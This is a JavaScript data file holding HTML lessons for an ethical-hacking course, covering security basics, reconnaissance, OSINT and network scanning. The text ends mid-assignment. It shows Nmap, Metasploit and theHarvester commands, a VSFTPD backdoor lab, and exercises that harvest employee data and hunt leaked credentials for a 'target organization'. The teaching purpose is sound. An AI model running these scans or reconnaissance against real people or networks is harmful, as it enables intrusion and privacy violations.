import { Network, Shield, Search } from 'lucide-react';
import { echo, help, whoami, ls, clear, date, history }  from './commands';

export const courseCategories =[
    {
        id: "cyber-fundamentals",
        title: "Cybersecurity Fundamentals",
        chapters: [
                {   
                id: "module-1",
                title: 'Module 1: Introduction to Cybersecurity and Ethical Hacking ',
                icon: Shield,
                sections: [
                    {
                        title: 'Week 1: Overview & CIA Triad',
                        content: `
                            <h4 class="font-bold">Part 1:Overview of Cybersecurity</h4>
                            <p class="mb-4">Cybersecurity is the practice of protecting systems, networks, and data from digital attacks. This includes safeguarding the integrity, availability, and confidentiality of information, while ensuring the secure operation of devices and systems.</p>
                            <p class="mb-4">Over the years, cybersecurity has evolved from simple antivirus software to a complex discipline involving threat detection, ethical hacking, incident response, and security engineering.</p>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Concepts:</strong> Understand the foundations of cybersecurity and the motivations behind it.</li>
                                <li><strong>Importance:</strong> With the rise of digitalization, securing data has become crucial for individuals, businesses, and governments.</li>
                                <li><strong>History:</strong> Trace the development of cybersecurity from its early days, including the evolution of viruses, worms, and other forms of cyber threats.</li>
                            </ul>
                            <h4 class="mt-4 font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Explore the Early Cybersecurity Timeline:</strong> Research and compile a timeline of the major events in the history of cybersecurity, including the rise of cyber threats and the development of significant defense strategies (e.g., the first known virus, Creeper in 1971).</li>
                                <li><strong>Tools:</strong> Use online resources to build your timeline (e.g., MITRE, SANS).</li>
                            </ul>
                            <h4 class="font-bold">CIA Triad: Confidentiality, Integrity, Availability</h4>
                            <p class="mb-4">The CIA Triad is the core concept in cybersecurity and is essential in designing security policies and strategies.</p>
                            <ul class="pl-6 mb-6">
                                <li><strong>Confidentiality:</strong> Ensures that sensitive information is accessible only to authorized users. <em>Example: Encrypting sensitive data (e.g., using AES or RSA encryption).</em></li>
                                <li><strong>Integrity:</strong> Ensures that the data remains unaltered and uncorrupted. <em>Example: Implementing hash functions (e.g., SHA-256) to verify data integrity and detect tampering.</em></li>
                                <li><strong>Availability:</strong> Ensures that data and services are available to users when needed. <em>Example: Implementing redundancy (e.g., backup systems, load balancers) to mitigate DDoS attacks.</em></li>
                            </ul>`
                    },
                    {
                        title: 'Part 2: Cyber Threats, Terminology & Frameworks',
                        content: `
                            <h4 class="font-bold">Common Cyber Threats</h4>
                            <p class="mb-4">Cyber threats come in many forms, and understanding these threats is crucial to developing strong defense mechanisms.</p>
                            <ul class="pl-6 mb-6">
                                <li><strong>Malware:</strong> Malicious software that disrupts or gains unauthorized access to systems.</li>
                                <li><strong>Phishing:</strong> A social engineering attack where fraudulent emails trick users into revealing personal information or installing malware.</li>
                                <li><strong>Social Engineering:</strong> Manipulating people into giving away sensitive information (e.g., through impersonation or fake emails).</li>
                            </ul>
                            <h4 class="font-bold">Key Terminology</h4>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Vulnerabilities:</strong> Weaknesses or flaws in a system that can be exploited.</li>
                                <li><strong>Exploits:</strong> Methods or code that take advantage of vulnerabilities.</li>
                                <li><strong>Threat Actors:</strong> Individuals or groups who launch attacks (e.g., hacktivists, cybercriminals, nation-state actors).</li>
                                <li><strong>Risk:</strong> The potential loss or damage resulting from an attack.</li>
                            </ul>
                            <h4 class="font-bold">Cybersecurity Frameworks: NIST, ISO 27001, MITRE ATT&CK</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>NIST:</strong> A framework for managing and reducing cybersecurity risks, focusing on Identify, Protect, Detect, Respond, and Recover.</li>
                                <li><strong>ISO 27001:</strong> A standard for managing information security with risk assessment and incident handling.</li>
                                <li><strong>MITRE ATT&CK:</strong> A knowledge base of adversary tactics and techniques to understand and defend against attacks.</li>
                            </ul>
                            <p><strong>Resources:</strong></p>
                            <ul>
                                <li><a href="https://attack.mitre.org/">MITRE ATT&CK Framework</a></li>
                                <li><a href="https://www.nist.gov/cyberframework">NIST Cybersecurity Framework</a></li>
                            </ul>`
                    },
                    {
                        title: 'Week 2: Introduction to Ethical Hacking',
                        content: `
                            <h1 class="font-bold">Part 1: Ethical Hacking vs. Malicious Hacking</h1>
                            <p class="mb-4">Ethical Hacking (or white-hat hacking) involves using the same tools and techniques as malicious hackers but with the aim of finding and fixing security flaws. This practice is legal and performed with the system owner's explicit permission. In contrast, Malicious Hacking (or black-hat hacking) is illegal and done to exploit systems for personal gain, financial theft, or disruption.</p>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Ethical Hacking:</strong> Legally sanctioned, aimed at identifying and fixing vulnerabilities, often a part of professional cybersecurity audits.</li>
                                <li><strong>Malicious Hacking:</strong> Illegal activity aimed at exploitation, with consequences including legal actions and imprisonment.</li>
                            </ul>
                            <h4 class="font-bold">Examples of Ethical Hacking</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Bug Bounty Programs:</strong> Companies like Google, Facebook, and Microsoft reward ethical hackers for discovering vulnerabilities.</li>
                                <li><strong>Penetration Testing:</strong> Cybersecurity professionals simulate attacks to identify and address vulnerabilities in corporate systems.</li>
                            </ul>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Legal & Ethical Hacking Research:</strong> Research a major legal case involving malicious hacking (e.g., Kevin Mitnick, Anonymous, or LulzSec). Write a short summary explaining the consequences of illegal hacking. Additionally, research an ethical hacking success story (e.g., a bug bounty hunter discovering a vulnerability).</li>
                            </ul>`
                    },
                    {
                        title: 'Part 2: Overview of Penetration Testing',
                        content: `
                            <h4 class="font-bold">Penetration Testing Overview</h4>
                            <p class="mb-4">Penetration Testing (pen-testing) simulates a controlled attack on a system or network to identify vulnerabilities. The goal is to find weaknesses, demonstrate risks, and provide recommendations for improving security.</p>
                            <h4 class="font-bold">Penetration Testing Goals</h4>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Find Vulnerabilities:</strong> Identify weak points before they are exploited by attackers.</li>
                                <li><strong>Demonstrate Risk:</strong> Show how vulnerabilities can lead to system compromise or data loss.</li>
                                <li><strong>Report Findings:</strong> Provide recommendations to mitigate vulnerabilities and strengthen security.</li>
                            </ul>
                            <h4 class="font-bold">Types of Penetration Tests</h4>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Black-box Testing:</strong> The tester has no prior knowledge of the system, simulating an external attack.</li>
                                <li><strong>White-box Testing:</strong> The tester has full knowledge of the system, including source code and network diagrams.</li>
                                <li><strong>Gray-box Testing:</strong> A combination of black-box and white-box testing, where the tester has partial knowledge of the system.</li>
                            </ul>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Penetration Testing Methodology Research:</strong> Research real-world penetration testing reports to understand their structure, common vulnerabilities, and how they are reported. Websites like Offensive Security provide sample pen-testing reports for reference.</li>
                            </ul>`
                    },
                    {
                        title: 'Part 3: Key Phases of Hacking',
                        content: `
                            <h4 class="font-bold">Key Phases of Ethical Hacking</h4>
                            <p class="mb-4">Ethical hacking and penetration testing follow methodical phases to ensure a thorough assessment of system security.</p>
                            <h4 class="font-bold">Phase 1: Reconnaissance</h4>
                            <p class="mb-4">In this phase, information is gathered about the target system. Reconnaissance can be active (scanning) or passive (researching publicly available information).</p>
                            <h4 class="font-bold">Phase 2: Scanning</h4>
                            <p class="mb-4">Scanning identifies open ports, running services, and vulnerabilities that could be exploited.</p>
                            <h4 class="font-bold">Phase 3: Exploitation</h4>
                            <p class="mb-4">This phase involves exploiting the vulnerabilities discovered during scanning to gain unauthorized access to the system.</p>
                            <h4 class="font-bold">Phase 4: Post-Exploitation</h4>
                            <p class="mb-4">Post-exploitation activities focus on maintaining access, escalating privileges, or exfiltrating data.</p>
                            <h4 class="font-bold">Phase 5: Reporting</h4>
                            <p class="mb-4">Reporting includes documenting vulnerabilities, exploitation steps, and remediation recommendations.</p>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Simulate the Five Phases:</strong> Using tools like Kali Linux, Nmap, and Metasploit, simulate the five phases of a penetration test in a controlled lab environment.</li>
                            </ul>`
                    },
                    {
                        title: 'Part 4: Setting Up a Penetration Testing Lab',
                        content: `
                            <h4 class="font-bold">Setting Up Your Penetration Testing Lab</h4>
                            <p class="mb-4">A penetration testing lab simulates real-world networks and systems, allowing you to practice ethical hacking techniques in a safe and controlled environment.</p>
                            <h4 class="font-bold">Step 1: Installing Kali Linux</h4>
                            <ul class="pl-6 mb-6">
                                <li>Download Kali Linux ISO from the official website.</li>
                                <li>Install Kali on VirtualBox or VMware (ensure sufficient resources).</li>
                            </ul>
                            <h4 class="font-bold">Step 2: Setting Up Metasploit</h4>
                            <ul class="pl-6 mb-6">
                                <li>Launch Metasploit using the command <code>sudo msfconsole</code>.</li>
                                <li>Start by exploiting vulnerable machines like Metasploitable2.</li>
                            </ul>
                            <h4 class="font-bold">Step 3: Vulnerable Virtual Machines</h4>
                            <ul class="pl-6 mb-6">
                                <li>Download Metasploitable2 and set it up in the same network as Kali Linux.</li>
                            </ul>
                            <h4 class="font-bold">Practical Lab:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Simulate an Attack:</strong> Use Kali Linux to scan the vulnerable Metasploitable2 machine using Nmap, and exploit one of the vulnerabilities (e.g., VSFTPD Backdoor).</li>
                                <li><strong>Post-Exploitation:</strong> After gaining access, use Meterpreter to navigate and perform post-exploitation tasks like privilege escalation.</li>
                            </ul>`
                    }
                ],
                videoUrl: 'https://www.youtube.com/embed/Otq0LY90Qso',
                commands: { whoami, echo, help, ls, clear, date, history },
                content: ''
                },
                {
                id: "module-2",  
                title: 'Module 2 - Reconnaissance and Information Gathering',
                icon: Shield,
                sections: [
                    {
                        title: 'Week 1: Passive and Active Reconnaissance',
                        content:`
                            <h4 class="font-bold">Overview of Reconnaissance</h4>
                            <p class="mb-4">In this module, we explore Reconnaissance, the first phase of ethical hacking and penetration testing. Reconnaissance, also known as information gathering, involves collecting data about the target network, system, or organization to prepare for a potential attack. Ethical hackers use this phase to gather crucial intelligence that helps in identifying vulnerabilities.</p>
                            <p class="mb-4">This week, we will differentiate between Passive and Active reconnaissance, explore various information-gathering techniques (including WHOIS, DNS enumeration, OSINT, and Google Dorking), and use advanced tools like Maltego, Recon-ng, and Shodan.</p>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Topics Covered:</strong> 
                                    <ul class="list-disc pl-6">
                                        <li>Difference between passive and active reconnaissance.</li>
                                        <li>WHOIS Lookup, DNS enumeration, and OSINT techniques.</li>
                                        <li>Google Dorking for information gathering.</li>
                                        <li>Tools: Maltego, Recon-ng, and Shodan for reconnaissance.</li>
                                    </ul>
                                </li>
                            </ul>
                            <h4 class="font-bold">Difference Between Passive and Active Reconnaissance</h4>
                            <p class="mb-4">Reconnaissance can be categorized into two types: Passive and Active. The following details explain each:</p>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Passive Reconnaissance:</strong>
                                    <ul class="list-disc pl-6">
                                        <li>No direct interaction with the target system. The goal is to remain undetected.</li>
                                        <li><strong>Techniques:</strong>
                                            <ul class="list-disc pl-6">
                                                <li>WHOIS Lookup: Retrieve domain registration information.</li>
                                                <li>DNS Enumeration: Identify domain names and associated IP addresses.</li>
                                                <li>OSINT (Open Source Intelligence): Gather public information using various online sources (social media, forums, public records).</li>
                                            </ul>
                                        </li>
                                    </ul>
                                </li>
                                <li><strong>Active Reconnaissance:</strong>
                                    <ul class="list-disc pl-6">
                                        <li>Direct interaction with the target system. Techniques like port scanning or sending crafted requests.</li>
                                        <li><strong>Techniques:</strong>
                                            <ul class="list-disc pl-6">
                                                <li>Port Scanning: Using tools like Nmap to scan for open ports.</li>
                                                <li>Vulnerability Scanning: Using tools like OpenVAS or Nessus to identify weaknesses.</li>
                                            </ul>
                                        </li>
                                    </ul>
                                </li>
                            </ul>
                            <h4 class="font-bold">Practical Differences:</h4>
                            <table class="table-auto border-collapse border border-gray-400 mb-6">
                                <thead>
                                    <tr>
                                        <th class="border border-gray-300 px-4 py-2">Passive Reconnaissance</th>
                                        <th class="border border-gray-300 px-4 py-2">Active Reconnaissance</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td class="border border-gray-300 px-4 py-2">No direct interaction with the target.</td>
                                        <td class="border border-gray-300 px-4 py-2">Direct interaction with the target.</td>
                                    </tr>
                                    <tr>
                                        <td class="border border-gray-300 px-4 py-2">Harder to detect.</td>
                                        <td class="border border-gray-300 px-4 py-2">Easier to detect (due to network traffic).</td>
                                    </tr>
                                    <tr>
                                        <td class="border border-gray-300 px-4 py-2">Information gathered through public sources.</td>
                                        <td class="border border-gray-300 px-4 py-2">Scanning and probing the target system.</td>
                                    </tr>
                                </tbody>
                            </table>
                    `},
                    {
                        title: 'Part 1: WHOIS Lookup, DNS Enumeration, and OSINT Techniques',
                        content:`
                            <h4 class="font-bold">WHOIS Lookup</h4>
                            <p class="mb-4">WHOIS is a public directory that provides registration details about a domain, such as the owner's name, email address, physical address, and more. Hackers use WHOIS to gather information about domain owners, identify targets, and locate technical contacts.</p>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Tools for WHOIS Lookup:</strong>
                                    <ul class="list-disc pl-6">
                                        <li>Linux Terminal: Use the built-in <code>whois</code> command. Example: <code>whois example.com</code></li>
                                        <li>Web-based WHOIS Lookup: Use sites like <a href="https://whois.domaintools.com">whois.domaintools.com</a> or <a href="https://whois.net">whois.net</a></li>
                                    </ul>
                                </li>
                            </ul>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>WHOIS Lookup:</strong> Use the Linux terminal or online WHOIS tools to gather information about a popular website (e.g., google.com). Document the owner’s details and other relevant information.</li>
                            </ul>`
                    },
                    {
                        title: 'Part 2: DNS Enumeration',
                        content:`
                            <h4 class="font-bold">DNS Enumeration</h4>
                            <p class="mb-4">DNS (Domain Name System) enumeration involves gathering information about a domain's DNS records. This can help hackers identify associated IP addresses, subdomains, and mail servers, which can be valuable for further exploitation.</p>
                            <h4 class="font-bold">DNS Records:</h4>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>A Record:</strong> Maps domain names to IP addresses.</li>
                                <li><strong>MX Record:</strong> Identifies the mail server responsible for email handling.</li>
                                <li><strong>NS Record:</strong> Lists the authoritative DNS servers for a domain.</li>
                            </ul>
                            <h4 class="font-bold">Tools for DNS Enumeration:</h4>
                            <ul class="list-disc pl-6 mb-6">
                                <li>Linux Terminal: Use the <code>dig</code> or <code>nslookup</code> commands. Example: <code>dig example.com</code> or <code>nslookup example.com</code></li>
                                <li><strong>DNS Recon:</strong> Use tools like <code>dnsrecon</code> or <code>dnsenum</code> to automate DNS enumeration.</li>
                            </ul>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>DNS Enumeration:</strong> Perform DNS enumeration on a public website (e.g., example.com) using <code>dig</code>. Document the DNS records (A, MX, NS) and analyze the information you’ve gathered.</li>
                            </ul>`
                    },
                    {
                        title: 'Part 3: OSINT Techniques and Google Dorking',
                        content:`
                            <h4 class="font-bold">OSINT Techniques (Open Source Intelligence)</h4>
                            <p class="mb-4">OSINT refers to the collection of publicly available data from the internet, which can be used to gather intelligence about individuals, companies, or systems. This involves mining data from:</p>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Social Media:</strong> Gathering information from LinkedIn, Facebook, Twitter, etc.</li>
                                <li><strong>Public Databases:</strong> Searching public records and government databases.</li>
                                <li><strong>Corporate Websites:</strong> Extracting information about employees, technologies used, etc.</li>
                            </ul>
                            <h4 class="font-bold">Tools for OSINT:</h4>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>theHarvester:</strong> An automated tool for gathering email addresses, subdomains, and more using public search engines. Example: <code>theHarvester -d example.com -l 100 -b google</code></li>
                                <li><strong>Recon-ng:</strong> A full-featured web reconnaissance framework for conducting OSINT searches. Example: <code>recon-ng</code></li>
                                <li><strong>SpiderFoot:</strong> A comprehensive OSINT automation tool that can perform network and domain recon.</li>
                            </ul>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>OSINT Investigation:</strong> Use theHarvester to gather email addresses and subdomains related to a target organization. Document the gathered data.</li>
                            </ul>
                            <h4 class="font-bold">Google Dorking for Information Gathering</h4>
                            <p class="mb-4">Google Dorking (also known as Google Hacking) uses advanced search queries in Google to find information that isn’t easily accessible through normal searches. These queries often uncover sensitive information that has been inadvertently exposed online, such as login credentials, confidential documents, and security vulnerabilities.</p>
                            <h4 class="font-bold">Common Google Dorking Operators:</h4>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>intitle::</strong> Searches for a term in the title of a web page.</li>
                                <li><strong>inurl::</strong> Searches for URLs that contain specific text.</li>
                                <li><strong>filetype::</strong> Finds specific types of files (e.g., PDF, DOCX).</li>
                                <li><strong>site::</strong> Limits search results to a specific site or domain.</li>
                            </ul>
                            <h4 class="font-bold">Example Google Dork Queries:</h4>
                            <ul class="list-disc pl-6 mb-6">
                                <li>Find login pages: <code>inurl:login site:example.com</code></li>
                                <li>Find PDF documents on a specific site: <code>filetype:pdf site:example.com</code></li>
                            </ul>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Google Dorking:</strong> Use Google Dorking techniques to find public documents or sensitive pages on a target website. Be sure to perform these searches legally and only on public data. Document your findings.</li>
                            </ul>
                            `
                    },
                    {
                        title: 'Part 4: Maltego, Recon-ng, and Shodan for Reconnaissance',
                        content:`
                            <ol class="list-decimal pl-6 mb-6">
                                <li><strong>Maltego:</strong> Maltego is a powerful tool used for data mining and information gathering. It creates graphs and relationships between people, companies, domains, and other entities. Maltego is often used in OSINT investigations.</li>
                                <li><strong>Recon-ng:</strong> Recon-ng is an advanced web reconnaissance tool that provides a modular framework for gathering OSINT. It automates the process of reconnaissance, making it efficient and comprehensive.</li>
                                <li><strong>Shodan:</strong> Shodan is a search engine designed to find internet-connected devices, including servers, routers, webcams, IoT devices, and industrial control systems.</li>
                            </ol>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Shodan Search:</strong> Use Shodan to search for publicly exposed devices within a specific geographic location or domain. Document any security issues found (e.g., open RDP ports).</li>
                            </ul>
                            <h4 class="font-bold">Assignment for Week 3:</h4>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Lab Report:</strong> Perform WHOIS lookup, DNS enumeration, and OSINT using theHarvester for a target organization. Write a 2-page report detailing the information gathered and analyze how this information can be used in future phases of a penetration test.</li>
                                <li><strong>Google Dorking Exercise:</strong> Perform Google Dorking using advanced search operators to find publicly available documents and login pages. Submit a summary of your findings.</li>
                            </ul>
                            <h4 class="font-bold">Additional Reading:</h4>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>Book:</strong> "The Hacker Playbook 3: Practical Guide to Penetration Testing" by Peter Kim — Covers advanced reconnaissance techniques and ethical hacking methods.</li>
                                <li><strong>Blog:</strong> "OSINT Framework" (<a href="https://osintframework.com/">https://osintframework.com/</a>) — A collection of tools and resources for gathering OSINT.</li>
                                <li><strong>Tool Guide:</strong> "Google Hacking Database" (<a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a>) — A database of Google dorks that expose vulnerable information online.</li>
                            </ul>
                            <h4 class="font-bold">Next Week Preview:</h4>
                            <p class="mb-4">Next week, we will cover Advanced OSINT Techniques, where we will explore how to mine data from social media, automated reconnaissance tools, and metadata analysis. You will also gain experience in deep and dark web OSINT.</p>`
                    },
                    {
                        title: 'Week 2: Social Media Mining for Cyber Intelligence',
                        content: `
                            <h4 class="font-bold">Part 1: Social Media as a Rich Source of Cyber Intelligence</h4>
                            <p class="mb-4">Social media platforms are among the most abundant sources of open-source intelligence (OSINT). They provide valuable data, such as personal information, organizational details, and potential vulnerabilities that could be exploited in cyberattacks.</p>
                            <ul class="list-disc pl-6 mb-6">
                                <li><strong>LinkedIn:</strong> Great for gathering information on employees, their roles, and technologies they work with.</li>
                                <li><strong>Twitter:</strong> Can reveal confidential company-related discussions and details about security measures.</li>
                                <li><strong>Facebook:</strong> Provides personal details such as location, habits, and other private information.</li>
                            </ul>
                            <h4 class="mt-4 font-bold">Tools for Social Media Mining</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Social-Engineer Toolkit (SET):</strong> Used for social engineering-based attacks like phishing.</li>
                                <li><strong>Maltego:</strong> A tool with built-in transforms for gathering data from platforms like LinkedIn, Twitter, and Facebook.</li>
                            </ul>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Social Media Mining with Maltego:</strong> Perform social media mining on a target company to gather employee-related data from LinkedIn.</li>
                                <li><strong>Analysis:</strong> Use this information to identify potential social engineering attack vectors like spear phishing.</li>
                            </ul>`
                    },
                    {
                        title: 'Part 2: Automated Reconnaissance Tools: SpiderFoot & theHarvester',
                        content: `
                            <h4 class="font-bold">Automating OSINT Collection</h4>
                            <p class="mb-4">Automated reconnaissance tools help streamline the process of collecting vast amounts of OSINT from a range of sources.</p>
                            <ul class="pl-6 mb-6">
                                <li><strong>SpiderFoot:</strong> An open-source tool designed to automate information gathering from over 200 public sources.</li>
                                <li><strong>theHarvester:</strong> A tool that collects emails, subdomains, and IP addresses from public sources like search engines and DNS servers.</li>
                            </ul>
                            <h4 class="mt-4 font-bold">SpiderFoot Features</h4>
                            <ul class="pl-6 mb-6">
                                <li>Automates data collection from WHOIS, DNS, social media, and more.</li>
                                <li>Generates detailed reports on the target.</li>
                            </ul>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>SpiderFoot Reconnaissance:</strong> Run SpiderFoot on a target domain to collect subdomains, DNS records, and other data.</li>
                            </ul>
                            <h4 class="mt-4 font-bold">Using theHarvester</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Scan with theHarvester:</strong> Gather emails and subdomains from a target domain.</li>
                            </ul>
                            <h4 class="font-bold">Exploring Hidden Online Spaces</h4>
                            <p class="mb-4">The deep and dark web hold hidden intelligence valuable for cybersecurity professionals. These areas can provide insights into stolen credentials, data breaches, and other illicit activities.</p>
                            <h4 class="font-bold">Deep Web</h4>
                            <p class="mb-4">The deep web consists of non-indexed areas of the internet, including private databases and academic resources. While not illegal, it requires specific access.</p>
                            <h4 class="font-bold">Dark Web</h4>
                            <p class="mb-4">The dark web is a hidden part of the deep web, often used for illegal activities. It’s accessible only through tools like Tor.</p>
                            <h4 class="font-bold">Dark Web Tools</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Tor Browser:</strong> Allows access to .onion sites.</li>
                                <li><strong>Ahmia:</strong> A search engine for the Tor network.</li>
                                <li><strong>OnionScan:</strong> Tool for assessing the security of dark web sites.</li>
                            </ul>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Lab Report:</strong> Perform a full OSINT investigation on a target company, using SpiderFoot, theHarvester, and Maltego. Write a report that includes social media mining, DNS enumeration, and metadata extraction results.</li>
                                <li><strong>Exploring the Dark Web:</strong> Use Tor and Ahmia to search for leaked credentials related to a specific target.</li>
                            </ul>`
                    },
                    {
                        title: 'Part 3: OSINT in Cybersecurity Operations',
                        content: `
                            <h4 class="font-bold">Additional Reading</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Book:</strong> "Hiding from the Internet: Eliminating Personal Online Information" by Michael Bazzell — A guide on how to minimize your online footprint.</li>
                                <li><strong>Blog:</strong> <a href="https://osinttechniques.com/" target="_blank">OSINT Techniques</a> — A collection of OSINT strategies, tools, and techniques for gathering cyber intelligence.</li>
                                <li><strong>Video Tutorial:</strong> "Dark Web OSINT Techniques" on YouTube for learning more about hidden online spaces.</li>
                            </ul>
                            <h4 class="font-bold">Next Week Preview</h4>
                            <p><strong>Next week:</strong> We will shift focus to Network Scanning and Enumeration. You’ll learn how to use tools like Nmap and Netcat to identify live systems, open ports, and services on a network.</p>

                `}
                    
                ],
                videoUrl: 'https://www.youtube.com/embed/Otq0LY90Qso',
                commands: { whoami, echo, help },
                content: ''
                },
                {
                id: "module-3",   
                title: 'Module 3 - Network Scanning Techniques',
                icon: Network,
                sections: [
                    {
                        title: 'Week 1: Introduction to Network Scanning',
                        content: `
                            <h4 class="font-bold">Part 1:Introduction to Network Scanning</h4>
                            <p class="mb-4">Network scanning is the process of discovering active devices, open ports, and services on a network. It's a fundamental step in penetration testing, allowing the tester to map the network and identify potential attack vectors.</p>
                            <h4 class="font-bold">Why Network Scanning is Important in Penetration Testing:</h4>
                            <ul class="pl-6 mb-6">
                                <li>Identify Active Hosts: Determine which machines are active on the network.</li>
                                <li>Discover Open Ports and Services: Find services running on hosts that could be vulnerable.</li>
                                <li>Evaluate Security Posture: Assess firewall configurations and intrusion detection/prevention system (IDS/IPS) rules.</li>
                                <li>Identify Misconfigurations: Reveal incorrectly configured services that can lead to exploits.</li>
                            </ul>
                            <h4 class="font-bold">Common Network Scanning Techniques:</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Ping Sweeps:</strong> Send ICMP requests to identify live hosts.</li>
                                <li><strong>Port Scanning:</strong> Probe systems to identify open ports and services running.</li>
                                <li><strong>Service Detection:</strong> Identify versions of services and applications to find vulnerable software.</li>
                            </ul>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p>Use Nmap to scan your local network for live hosts and open ports:</p>
                            <code>sudo nmap -sn 192.168.1.0/24</code>
                        `
                    },
                    {
                        title: 'Part 2: Nmap Deep Dive: Port Scanning, Service Detection, and Script Engine',
                        content: `
                            <h4 class="font-bold">Nmap Deep Dive</h4>
                            <p class="mb-4">Nmap is one of the most widely used tools for network scanning, used to discover hosts, services, and potential vulnerabilities.</p>
                            <h4 class="font-bold">1. Port Scanning</h4>
                            <p>Identify open ports and services:</p>
                            <ul class="pl-6 mb-6">
                                <li><strong>SYN Scan (-sS):</strong> A stealth scan that performs a half-open connection.</li>
                                <li><strong>UDP Scan (-sU):</strong> Scans for open UDP ports.</li>
                                <li><strong>Full TCP Connect Scan (-sT):</strong> Establishes a full connection with the target.</li>
                            </ul>
                            <p><strong>Practical Activity:</strong> Perform a SYN Scan on a target:</p>
                            <code>sudo nmap -sS -p 1-1000 192.168.1.10</code>
                            <h4 class="font-bold">2. Service Detection</h4>
                            <p>Detect services and their versions:</p>
                            <code>sudo nmap -sV 192.168.1.10</code>
                            <h4 class="font-bold">3. Nmap Scripting Engine (NSE)</h4>
                            <p>Use NSE scripts for vulnerability detection:</p>
                            <code>sudo nmap --script vuln 192.168.1.10</code>
                        `
                    },
                    {
                        title: 'Part 3: Identifying Live Hosts and Services',
                        content: `
                            <h4 class="font-bold">Ping Sweeps</h4>
                            <p>Identify live hosts using ICMP echo requests.</p>
                            <code>sudo nmap -sn 192.168.1.0/24</code>
                            <h4 class="font-bold">ARP Scans</h4>
                            <p>Identify hosts on the same local network:</p>
                            <code>sudo arp-scan 192.168.1.0/24</code>
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p>Perform an ARP Scan using Nmap:</p>
                            <code>sudo nmap -PR 192.168.1.0/24</code>
                        `
                    },
                    {
                        title: 'Part 4: Vulnerability Scanning Tools: OpenVAS, Nessus, and Qualys',
                        content: `
                            <h4 class="font-bold">OpenVAS</h4>
                            <p>An open-source vulnerability scanner with extensive scanning capabilities.</p>
                            <code>sudo apt install openvas && sudo gvm-setup</code>
                            <h4 class="font-bold">Nessus</h4>
                        <p class="mb-4">Nessus is a well-known vulnerability scanner used by both professionals and organizations to detect vulnerabilities, misconfigurations, and compliance violations. It’s known for its detailed reporting and active threat intelligence feeds.</p>
                        <ul class="list-disc pl-6 mb-6">
                            <li><strong>Large database of known vulnerabilities and exploits.</strong></li>
                            <li><strong>Real-time monitoring and compliance checks.</strong></li>
                            <li><strong>Risk-prioritized reports focusing on the most critical vulnerabilities.</strong></li>
                        </ul>
                        <h4 class="font-bold">Practical Activity:</h4>
                        <ul class="pl-6 mb-6">
                            <li><strong>Nessus Installation:</strong> Download Nessus from Tenable’s website and install it.</li>
                            <li><strong>Scan Configuration:</strong> Configure a scan and run it against a target network or host.</li>
                        </ul>
                            <<h4 class="font-bold">Qualys</h4>
                        <p class="mb-4">Qualys is a cloud-based vulnerability management tool that offers advanced scanning capabilities, including continuous monitoring, web application scanning, and more. It’s widely used for large-scale enterprise vulnerability scanning and compliance management.</p>
                        <ul class="list-disc pl-6 mb-6">
                            <li><strong>Cloud-based platform with real-time scanning and alerting.</strong></li>
                            <li><strong>Strong compliance auditing features (PCI, HIPAA, etc.).</strong></li>
                            <li><strong>Ability to scan cloud environments, web applications, and mobile apps.</strong></li>
                        </ul>
                        <h4 class="font-bold">Practical Activity:</h4>
                        <ul class="pl-6 mb-6">
                            <li><strong>Qualys Cloud-Based Scan:</strong> Sign up for a free trial of Qualys.</li>
                            <li><strong>Perform a vulnerability scan:</strong> Conduct a scan on a web application or internal network and review the results.</li>
                        </ul>
                            
                        `
                    },
                    {
                        title: 'Assignment for Week 1 ',
                        content: `
                    <h4 class="font-bold">Additional Reading:</h4>
                    <ul class="list-disc pl-6 mb-6">
                    <li><strong>Lab Report:</strong> Perform a full network scan of your home network using Nmap. Include a ping sweep to identify live hosts, a SYN scan to identify open ports, and run NSE scripts to identify vulnerabilities. Write a report detailing your findings, including services detected and potential vulnerabilities. </li>
                    <li><strong>Vulnerability Scan: </strong> Set up OpenVAS on Kali Linux and run a vulnerability scan on a local network. Submit the scan results along with a risk assessment and proposed mitigations for the vulnerabilities found. </li>
                </ul>      
